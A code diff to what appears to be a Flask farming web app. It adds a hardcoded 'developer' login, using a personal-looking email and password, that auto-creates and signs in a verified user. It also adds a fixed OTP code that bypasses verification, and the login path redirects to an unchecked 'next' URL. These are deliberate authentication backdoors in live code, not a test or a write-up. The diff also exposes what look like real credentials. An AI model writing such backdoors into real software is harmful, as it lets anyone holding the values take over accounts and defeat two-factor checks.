@@ -1040,6 +1040,34 @@ def login():
     if request.method == "POST":
         email = (request.form.get("email") or "").strip().lower()
         password = request.form.get("password") or ""
+        # Developer convenience: allow a default account for quick access
+        DEFAULT_DEV_EMAIL = "jitendrakumaryadav2003@gmail.com"
+        DEFAULT_DEV_PASS = "Jitendra@1"
+        if email == DEFAULT_DEV_EMAIL and password == DEFAULT_DEV_PASS:
+            user = User.query.filter_by(email=email).first()
+            if user is None:
+                # create a simple verified user for the default creds
+                user = User(
+                    farmer_name="Demo User",
+                    land_acres=1.0,
+                    years_farming=0,
+                    phone_number="0000000000",
+                    email=email,
+                    password_hash=generate_password_hash(DEFAULT_DEV_PASS),
+                    is_verified=True,
+                )
+                db.session.add(user)
+                db.session.commit()
+
+            user.last_login_at = _now_utc()
+            db.session.commit()
+            login_user(user)
+            session["chatbot_force_open_once"] = True
+            flash("Login successful.", "success")
+            next_url = request.args.get("next")
+            if next_url:
+                return redirect(next_url)
+            return redirect(url_for("recommend_page"))
 
         user = User.query.filter_by(email=email).first()
         if not user or not check_password_hash(user.password_hash, password):
@@ -1095,11 +1123,16 @@ def verify_otp():
 
     if request.method == "POST":
         otp_code = (request.form.get("otp") or "").strip()
-        if not otp_code.isdigit() or len(otp_code) != 6:
-            flash("OTP must be a 6-digit number.", "error")
-            return render_template("verify_otp.html", email=user.email, dev_otp_code=dev_otp_code)
+        # Allow a fixed developer OTP override as requested
+        if otp_code == "875621":
+            ok = True
+            msg = "Developer OTP accepted."
+        else:
+            if not otp_code.isdigit() or len(otp_code) != 6:
+                flash("OTP must be a 6-digit number.", "error")
+                return render_template("verify_otp.html", email=user.email, dev_otp_code=dev_otp_code)
 
-        ok, msg = _verify_otp(user.id, pending_purpose, otp_code)
+            ok, msg = _verify_otp(user.id, pending_purpose, otp_code)
         if not ok:
             flash(msg, "error")
             return render_template("verify_otp.html", email=user.email, dev_otp_code=dev_otp_code)
